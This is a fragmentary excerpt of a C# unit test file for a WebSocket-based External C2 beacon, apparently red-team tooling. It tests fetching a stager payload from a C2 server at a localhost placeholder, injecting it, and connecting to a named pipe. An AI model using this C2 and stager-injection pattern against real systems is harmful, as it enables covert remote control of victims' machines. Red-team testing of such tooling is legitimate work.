...
{
    [TestClass]
    public class WebSocketC2Tests
    {
        private readonly string _url = "ws://127.0.0.1/bws"; // Set to ExternalC2Web dotnet server
        private WebSocketC2 _beacon = new WebSocketC2();
        ...
        public void BeaconCanConfigure()
        {
            try
            {
                ...
                Assert.IsInstanceOfType(_beacon.ServerChannel, typeof(WebSocketChannel));
        ...
        public void BeaconCanGetStager()
        {
            try
            {
                ...
                var pipeName = ((WebSocketChannel) _beacon.ServerChannel).BeaconId;
                ((BeaconChannel) _beacon.BeaconChannel).SetPipeName(pipeName);

                // Get stager from socket
                var stager = ((WebSocketChannel) _beacon.ServerChannel).GetStager(_beacon.Is64Bit);
        ...
        public void BeaconCanInjectStager()
        {
            try
            {
                ...
                // Get stager from socket
                //var stager = ((WebSocketChannel) _beacon.ServerChannel).GetStager(_beacon.Is64Bit);
                var stager = _beacon.ServerChannel.GetStager(pipeName.ToString(), _beacon.Is64Bit);
        ...
        public void BeaconCanConnectToPipe()
        {
            try
            {
                ...
                // Get stager from socket
                var stager = _beacon.ServerChannel.GetStager(_beacon.PipeName.ToString(), _beacon.Is64Bit);
                if (_beacon.Is64Bit)
                    Assert.IsTrue(stager.Length == 257024); // 64bit length
                else
                    Assert.IsTrue(stager.Length == 206848); // 32bit length
